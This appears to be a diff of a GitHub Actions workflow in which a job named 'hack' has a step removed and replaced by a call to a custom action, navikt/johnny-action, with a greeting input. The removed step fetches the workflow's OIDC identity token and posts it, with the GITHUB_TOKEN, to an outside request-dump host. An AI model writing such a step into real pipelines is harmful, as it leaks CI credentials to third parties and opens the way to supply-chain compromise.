@@ -11,8 +11,9 @@ jobs:
     name: hack
     runs-on: ubuntu-latest
     steps:
-      - name: dump request
-        run: |
-          payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
-          curl https://reqdump.fly.dev --data "$payload" -H"Authorization: ${{env.GITHUB_TOKEN}}"
+      # use custom action on github.com/navikt/johnny-action
+      - name: Run johnny-action
+        uses: navikt/johnny-action@v1
+        with:
+          greeting: "Hello, world!"
 
